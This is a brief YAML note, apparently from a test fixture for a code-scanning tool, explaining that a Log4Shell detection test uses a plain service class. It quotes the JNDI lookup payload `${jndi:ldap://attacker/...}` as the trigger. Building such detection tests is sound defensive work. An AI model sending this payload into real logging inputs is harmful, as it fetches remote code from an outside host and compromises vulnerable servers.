notes: |
  Log4Shell — JNDI lookup substitution in any Logger method that
  evaluates message strings.  Trigger is `Logger.error(userInput)`
  where userInput contains `${jndi:ldap://attacker/...}`.  Affects
  every level method that interpolates the message.

  Fixture uses a plain service class (no framework annotations) to
  isolate the symbol-resolution test from any controller / route
  detection logic.
